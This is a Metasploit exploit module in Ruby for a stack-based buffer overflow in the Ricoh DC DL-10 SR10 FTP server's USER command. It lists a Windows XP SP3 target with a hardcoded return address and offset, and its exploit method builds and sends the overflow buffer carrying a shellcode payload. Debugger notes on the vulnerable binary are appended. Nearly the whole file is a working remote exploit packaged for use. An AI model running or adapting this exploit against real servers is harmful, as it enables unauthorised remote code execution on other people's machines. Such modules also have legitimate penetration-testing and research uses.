# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Ftp
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Ricoh DC DL-10 SR10 FTP USER Command Buffer Overflow",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Ricoh DC&#039;s DL-10 SR10 FTP
                service.  By supplying a long string of data to the USER command, it is
                possible to trigger a stack-based buffer overflow, which allows remote code
                execution under the context of the user.
 
                    Please note that in order to trigger the vulnerability, the server must
                be configured with a log file name (by default, it&#039;s disabled).
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Julien Ahrens&#039;, #Discovery, PoC
                    &#039;sinn3r&#039;         #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;OSVDB&#039;, &#039;79691&#039;],
                    [&#039;URL&#039;, &#039;http://secunia.com/advisories/47912&#039;],
                    [&#039;URL&#039;, &#039;http://www.inshell.net/2012/03/ricoh-dc-software-dl-10-ftp-server-sr10-exe-remote-buffer-overflow-vulnerability/&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    # Yup, no badchars
                    &#039;BadChars&#039; => "\x00",
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "process",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Windows XP SP3&#039;,
                        {
                            &#039;Ret&#039;    => 0x77c35459,  #PUSH ESP; RETN (msvcrt.dll)
                            &#039;Offset&#039; => 245
                        }
                    ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Mar 1 2012",
            &#039;DefaultTarget&#039;  => 0))
 
        # We&#039;re triggering the bug via the USER command, no point to have user/pass
        # as configurable options.
        deregister_options(&#039;FTPPASS&#039;, &#039;FTPUSER&#039;)
    end
 
    def check
        connect
        disconnect
        if banner =~ /220 DSC ftpd 1\.0 FTP Server/
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def exploit
        buf = &#039;&#039;
        buf << rand_text_alpha(target[&#039;Offset&#039;], payload_badchars)
        buf << [target.ret].pack(&#039;V&#039;)
        buf << make_nops(20)
        buf << payload.encoded
 
        print_status("#{rhost}:#{rport} - Sending #{self.name}")
        connect
        send_user(buf)
        handler
        disconnect
    end
end
 
=begin
0:002> lmv m SR10
start    end        module name
00400000 00410000   SR10       (deferred)            
    Image path: C:\Program Files\DC Software\SR10.exe
    Image name: SR10.exe
    Timestamp:        Mon May 19 23:55:32 2008 (483275E4)
    CheckSum:         00000000
    ImageSize:        00010000
    File version:     1.0.0.520
    Product version:  1.0.0.0
    File flags:       0 (Mask 3F)
    File OS:          4 Unknown Win32
    File type:        1.0 App
    File date:        00000000.00000000
    Translations:     0409.04b0
    CompanyName:      Ricoh Co.,Ltd.
    ProductName:      SR-10
    InternalName:     SR-10
    OriginalFilename: SR10.EXE
    ProductVersion:   1, 0, 0, 0
    FileVersion:      1, 0, 0, 520
    PrivateBuild:     1, 0, 0, 520
    SpecialBuild:     1, 0, 0, 520
    FileDescription:  SR-10
 
 
Note: No other DC Software dlls are loaded when SR-10.exe is running, so the most
stable component we can use is msvcrt.dll for now.
=end



